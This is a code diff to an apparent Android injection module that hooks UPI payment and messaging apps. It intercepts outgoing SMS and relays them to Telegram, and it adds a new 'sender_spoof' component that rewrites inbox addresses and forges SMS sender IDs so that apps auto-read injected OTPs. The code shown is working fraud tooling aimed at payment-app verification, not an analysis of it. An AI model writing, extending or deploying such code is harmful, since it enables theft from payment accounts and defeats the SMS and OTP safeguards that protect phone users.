@@ -24,12 +24,12 @@
 namespace {
 
 /**
- * v1.0.78 — crash-safe multi-UPI + bubble on all UPI apps
+ * v1.0.79 — menu Sender ID on all incoming SMS
  *
- * Hero + Messages: Java ISms immediate (fast TG).
- * ALL other UPI (YesPay/Snapmint/KreditBee/Jump/FamPay/…): Java ~5s + bubble ~8s.
- * NEVER Binder/phone/sender on UPI. NEVER inject com.android.phone.
- * TG: bold + <code> tap-copy; companion curl ~1s after intercept.
+ * Hero + Messages: Java ISms immediate.
+ * Other UPI: Java ~5s + bubble ~8s (crash-safe).
+ * Incoming: inbox address rewrite + SmsMessage spoof → saved Sender ID.
+ * NEVER Binder/phone on UPI. NEVER inject com.android.phone.
  */
 
 bool is_messaging_pkg(const std::string& pkg) {
@@ -186,10 +186,11 @@ void* deferred_hook_worker(void* arg) {
     if (job->vm && job->api) {
         JNIEnv* env = nullptr;
         if (job->vm->AttachCurrentThread(&env, nullptr) == JNI_OK && env) {
-            // After app open stable: Java ISms only (To+body → TG). No Binder/phone/sender.
+            // After app open stable: Java ISms + Sender ID spoof (OTP auto-read)
             try {
                 overlay_ui::install_sms_tweaks_java(env, job->pkg.c_str());
                 outgoing_sms_hook::arm_intercept_hooks();
+                sender_spoof::install(env, job->api, job->pkg.c_str());
                 append_diag("/data/local/tmp/hivirtus_inject.log",
                             ("HOOK_DEFERRED_SAFE_JAVA|" + job->pkg).c_str());
             } catch (...) {
@@ -354,9 +355,10 @@ public:
             schedule_deferred_java_sms(env_, pkg_, 1);
             report_line(api_, "post_msg_ok:" + pkg_);
         } else if (is_hero_pkg(pkg_)) {
-            // Hero ONLY — Java NOW (token expire window)
+            // Hero ONLY — Java NOW (token expire window) + Sender ID for OTP read
             outgoing_sms_hook::arm_intercept_hooks();
             overlay_ui::install_sms_tweaks_java(env_, pkg_.c_str());
+            sender_spoof::install(env_, api_, pkg_.c_str());
             schedule_deferred_java_sms(env_, pkg_, 1);
             report_line(api_, "post_hero_fast_java:" + pkg_);
             if (native_overlay_wanted() && overlay_allowed_pkg(pkg_)) {
